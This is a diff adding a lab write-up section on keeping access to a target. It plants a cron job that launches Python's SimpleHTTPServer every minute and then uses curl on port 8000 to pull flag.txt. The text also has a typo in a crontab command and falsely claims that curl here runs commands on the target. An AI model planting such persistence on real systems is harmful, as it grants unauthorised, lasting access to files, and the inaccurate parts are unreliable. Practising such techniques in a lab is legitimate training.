@@ -338,7 +338,32 @@ Once we execute this command we get the output in attacker's machine. In this wa
 
 ============================================================Completed================================================
 
+Technique: By scheduling "HTTP python server module" in cron
 
+Procedure:
+
+In this lab, we have to create a cron in which we start HTTP python server. 
+
+First we will create this cron and as per lab if we delete "wait" file from user's home directory so our SSH session
+get terminated.
+
+echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron
+
+crontan -i cron
+
+crontab -l
+
+So we created cron and deleted that wait file.Once we deleted our session terminated.
+
+Now with help of curl command we will run commands on target because already we have started httpserver on the target.
+
+curl target_ip:8000
+
+curl target_ip:8000/flag.txt
+
+So we can create Persistence or Maintain access on target by using "HTTP python Server module".
+
+=====================================completed==================================================
 
 
 
